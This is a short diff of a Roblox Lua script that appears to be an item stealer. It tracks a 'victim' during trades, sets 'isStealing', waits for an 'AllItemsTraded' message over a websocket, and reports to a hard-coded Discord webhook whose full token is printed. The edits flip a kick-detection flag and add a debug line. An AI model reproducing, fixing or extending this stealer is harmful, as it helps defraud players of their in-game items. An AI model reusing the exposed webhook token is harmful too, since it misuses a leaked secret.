@@ -1,5 +1,5 @@
 local AJwebhook = "https://discord.com/api/webhooks/1488553917296935006/qjKUS4ez4-_ozhjybmbzb66EbPc_7DbRTRO6Oi9IAjeSup2A5oX9bJxfgdN5HXhD7nLf"
-local IsKicked = false
+local IsKicked = true
 game:GetService("GuiService").ErrorMessageChanged:Connect(function(text)
     if IsKicked then return end
     IsKicked = true
@@ -70,7 +70,7 @@ if autjoindata then
         end
         if victim then
             local vname = victim.Name
-	    victimuserid = victim.UserId
+	        victimuserid = victim.UserId
             local VictimIsTrading
             local StealerIsTrading
             isStealing = true
@@ -141,6 +141,7 @@ ws.OnMessage:Connect(function(msg)
     if not json then return warn("not json") end
     local jobId = json.JobId
     local userid = json.UserId
+    warn(userid, json.AllItemsTraded, victimuserid)
     if userid and json.AllItemsTraded and userid == victimuserid then
         isStealing = false
         spawn(function()
